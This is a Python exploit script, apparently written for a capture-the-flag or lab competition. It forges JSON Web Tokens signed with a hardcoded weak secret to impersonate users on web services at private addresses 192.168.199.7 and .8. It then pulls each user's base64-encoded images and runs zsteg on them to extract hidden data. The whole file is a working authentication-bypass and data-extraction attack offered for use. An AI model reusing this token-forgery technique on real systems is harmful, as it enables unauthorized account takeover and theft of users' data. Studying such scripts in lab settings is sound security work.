#!/usr/bin/env python3

import requests
import jwt
import base64
import sys
from pwn import *
import subprocess
import tempfile
import os

SECRET = "abcdabcd"

def create_admin_jwt(username):
    payload = {"name": username}
    token = jwt.encode(payload, SECRET, algorithm="HS256")
    return token

def exploit_specific_user(username, TARGET_URL):
    session = requests.Session()

    try:
        token = create_admin_jwt(username)
        session.cookies.set("session", token)


        profile_response = session.get(f"{TARGET_URL}/profile")
        if profile_response.status_code == 200:

            view_response = session.get(f"{TARGET_URL}/view/{username}")
            if view_response.status_code == 200:

                import re
                image_ids = re.findall(r'/image/(\d+)', view_response.text)

                for img_id in set(image_ids):

                    img_response = session.get(f"{TARGET_URL}/image/{img_id}")
                    a = img_response.text.split(":image/png;base64, ")[1].split('" />')[0]
                    return a


        return None

    except Exception as e:
        return None


def zsteg_from_base64(base64_string, output_file=None):

    image_data = base64.b64decode(base64_string)

    with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as temp_file:
        temp_file.write(image_data)
        temp_file_path = temp_file.name

    try:
        result = subprocess.run(['zsteg', temp_file_path],
                              capture_output=True, text=True)

        print(result.stdout, flush=True)


    finally:
        os.unlink(temp_file_path)

if __name__ == "__main__":

    us = [7,8]

    for user in us:
        try:
            print(user)
            ip = f"192.168.199.{user}"
            TARGET_URL = "http://"+f"{ip}:"+"3000"
            a = exploit_specific_user(user, TARGET_URL)
            zsteg_from_base64(a, "results.txt")
        except:
            pass